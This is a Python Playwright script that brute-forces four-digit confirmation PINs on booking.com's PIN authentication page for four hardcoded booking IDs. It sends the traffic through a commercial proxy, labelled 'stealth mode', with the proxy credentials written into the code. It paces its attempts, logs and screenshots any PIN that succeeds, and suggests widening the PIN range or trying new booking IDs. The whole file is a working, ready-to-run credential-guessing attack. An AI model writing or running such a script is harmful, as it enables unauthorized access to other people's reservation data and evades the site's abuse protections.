from playwright.sync_api import sync_playwright
import os
import time

# SKIPPED PINs that need to be tested
SKIPPED_PINS = "0056,0330,0515,1133,1310,1329,1389,1906,2290,2377,2421,2556,2727,2931,3002,3825,3876,4073,4093,4282,4718,5096,5103,5449,5611,5734,6215,6723,6923,7027,7288,7463,7836,7964,8002,8052,8168,8289,8343,8622,8649,9058,9116,9725"

# Boss's 4 booking IDs
BOOKING_IDS = ["6339614781", "6860261353", "6160911170", "5830944764"]

PINS = [p.strip() for p in SKIPPED_PINS.split(",") if p.strip()]
WAIT_TIME = 5  # Faster testing
HEADLESS = False
LOG_FILE = "skipped_pins_recovery.csv"
SCREEN_DIR = "skipped_pins_screenshots"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(booking_id, pin, result, url):
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')},RECOVERY_AGENT,{booking_id},{pin},{result},{url}\n")

print("🎯 SKIPPED PIN RECOVERY MISSION")
print(f"📋 Testing {len(PINS)} skipped PINs across {len(BOOKING_IDS)} booking IDs")
print(f"🎯 Total tests: {len(PINS) * len(BOOKING_IDS)} PIN attempts")
print(f"🔍 Booking IDs: {', '.join(BOOKING_IDS)}")
print(f"🔑 PINs: {', '.join(PINS[:10])}... (+{len(PINS)-10} more)")

total_success = 0
total_failure = 0
total_unknown = 0
total_exception = 0

with sync_playwright() as p:
    print("🚀 Starting Playwright...")
    
    # PROXY CONFIGURATION - UPDATED FOR RECOVERY
    proxy_config = {
        "server": "https://pr.oxylabs.io:7777",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }
    print(f"🛡️ STEALTH MODE: Proxy configured - {proxy_config['server']}")
    
    browser = p.chromium.launch(
        headless=HEADLESS,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for booking_id in BOOKING_IDS:
        print(f"\n🎯 TESTING BOOKING ID: {booking_id}")
        print("=" * 50)
        
        booking_success = 0
        booking_failure = 0
        booking_unknown = 0
        booking_exception = 0
        
        for i, pin in enumerate(PINS, 1):
            print(f"\n🔁 [{i}/{len(PINS)}] Testing PIN: {pin} for booking {booking_id}")
            
            try:
                # LOGIC 1: Open browser and wait until completely loaded
                print("🌐 Opening booking.com...")
                page.goto("https://secure.booking.com/help/confirmation_pin_auth")
                print("⏳ Waiting for page to load completely...")
                page.wait_for_load_state("networkidle")  # Wait until no network activity
                print("✅ Page loaded completely!")

                # LOGIC 2: Fill booking ID and PIN, then click continue
                print("📝 Looking for booking ID field...")
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
                print(f"📝 Filling booking ID: {booking_id}")
                page.fill('input[placeholder="e.g. 1234567890"]', booking_id)
                
                print(f"🔐 Filling PIN: {pin}")
                page.fill('input[placeholder="e.g. 1234"]', pin)
                
                print("🔍 Looking for Continue button...")
                try:
                    page.wait_for_selector('button:has-text("Continue")')
                    print("✅ Clicking Continue button...")
                    page.click('button:has-text("Continue")')
                except:
                    page.wait_for_selector('button[type="submit"]')
                    print("✅ Clicking Submit button...")
                    page.click('button[type="submit"]')

                # LOGIC 3: Wait for results
                print("⏳ Waiting for results...")
                time.sleep(3)  # Quick wait for redirect
                
                # Check results
                current_url = page.url
                print(f"🔍 Current URL: {current_url}")
                
                # Check for SUCCESS: URL contains success indicators
                if ("unique_order_id" in current_url or 
                    "booking_details" in current_url or 
                    "/help/reservation" in current_url):
                    print(f"🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}!")
                    print(f"✅ Success URL: {current_url}")
                    page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_SUCCESS.png")
                    log_result(booking_id, pin, "SUCCESS", current_url)
                    booking_success += 1
                    total_success += 1
                    print("🎉 SUCCESS FOUND! Pausing 20 seconds to see the page...")
                    time.sleep(20)  # Pause to see the result
                    # Don't break - continue testing other PINs
                    
                # Check for FAILURE: Help page indicates wrong PIN
                elif "help/confirmation_pin_auth" in current_url:
                    # Additional check for content on help page
                    page_text = page.inner_text('body')
                    if ("invalid" in page_text.lower() or 
                        "incorrect" in page_text.lower() or 
                        "wrong" in page_text.lower() or
                        "authentication failed" in page_text.lower()):
                        print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
                        page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_FAIL.png")
                        log_result(booking_id, pin, "FAILURE", current_url)
                        booking_failure += 1
                        total_failure += 1
                    else:
                        print(f"❓ PIN {pin} redirected to help page for booking {booking_id}")
                        page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_HELP.png")
                        log_result(booking_id, pin, "HELP_PAGE", current_url)
                        booking_unknown += 1
                        total_unknown += 1
                        
                else:
                    print(f"❓ Unknown result for PIN {pin} with booking {booking_id}")
                    page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_UNKNOWN.png")
                    log_result(booking_id, pin, "UNKNOWN", current_url)
                    booking_unknown += 1
                    total_unknown += 1

            except Exception as e:
                print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
                page.screenshot(path=f"{SCREEN_DIR}/{booking_id}_{pin}_EXCEPTION.png")
                log_result(booking_id, pin, "EXCEPTION", page.url)
                booking_exception += 1
                total_exception += 1

            # Small pause before next PIN
            if i < len(PINS):
                print(f"⏳ Waiting {WAIT_TIME}s before next PIN...")
                time.sleep(WAIT_TIME)

        print(f"\n📊 BOOKING {booking_id} SUMMARY:")
        print(f"✅ Success: {booking_success}")
        print(f"❌ Failure: {booking_failure}")
        print(f"❓ Unknown: {booking_unknown}")
        print(f"💥 Exception: {booking_exception}")
        
        # Brief pause between booking IDs
        if booking_id != BOOKING_IDS[-1]:
            print("\n⏸️ Tactical pause between booking IDs... (10 seconds)")
            time.sleep(10)

    browser.close()

print(f"\n🎯 FINAL RECOVERY MISSION SUMMARY")
print("=" * 50)
print(f"📊 Total PIN attempts: {len(PINS) * len(BOOKING_IDS)}")
print(f"✅ Total Success: {total_success}")
print(f"❌ Total Failure: {total_failure}")
print(f"❓ Total Unknown: {total_unknown}")
print(f"💥 Total Exception: {total_exception}")
print(f"")
print(f"📄 Results logged in: {LOG_FILE}")
print(f"📷 Screenshots saved in: {SCREEN_DIR}/")

if total_success > 0:
    print(f"")
    print(f"🎉 MISSION SUCCESS! Found {total_success} working PIN(s)!")
    print(f"🔍 Check {LOG_FILE} for SUCCESS entries!")
else:
    print(f"")
    print(f"📋 Mission complete - no SUCCESS found in skipped PINs")
    print(f"🔄 Consider expanding PIN range or checking new booking IDs")
